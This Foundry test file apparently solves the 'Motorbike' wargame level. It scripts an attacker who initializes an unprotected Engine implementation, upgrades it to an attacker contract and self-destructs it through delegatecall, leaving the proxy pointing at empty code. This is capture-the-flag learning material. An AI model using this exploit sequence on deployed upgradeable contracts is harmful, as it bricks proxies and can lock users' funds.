// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine} from "../src/contracts/25_Motorbike.sol";
import {MotorbikeAttacker} from "../src/attackers/25_MotorbikeAttacker.sol";

contract MotorbikeTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");

    Engine private engine;
    Motorbike private motorbike;
    MotorbikeAttacker private motorbikeAttacker;

    function setUp() public {
        vm.startPrank(owner);
        engine = new Engine();
        motorbike = new Motorbike(address(engine));
        vm.stopPrank();

        executeAttack();
    }

    function executeAttack() public {
        vm.startPrank(attacker);
        // We cannot become upgrader of Proxy (Motorbike)
        // But we can become upgrader of the Implementation (Engine)
        // upgrader (Engine) == attacker
        // upgrader (Motorbike) == owner
        engine.initialize();

        // deploy attacker smart contract
        motorbikeAttacker = new MotorbikeAttacker();

        // Now the upgrader (attacker) of the implementation (Engine)
        // can call `upgradeToAndCall` calling the `destroy()` of the new implementation (Attacker Contract)
        // Attacker => `Engine::upgradeToAndCall` => delegatecall `MotorbikeAttacker::destroy()`
        // => `destroy()` is executed in the context of Engine
        // => Engine is selfdestructed => Engine does NOT have code
        // => `Motorbike::_IMPLEMENTATION_SLOT` stores an address with NON EXISTENT code
        engine.upgradeToAndCall(
            address(motorbikeAttacker),
            abi.encodeWithSelector(motorbikeAttacker.destroy.selector, attacker)
        );
        vm.stopPrank();
    }

    function test_MotorbikeExploitVulnerability() public view {
        address engineAddr = address(engine);
        uint256 engineSize;
        assembly {
            engineSize := extcodesize(engineAddr)
        }

        assertEq(engineSize, 0);
    }
}
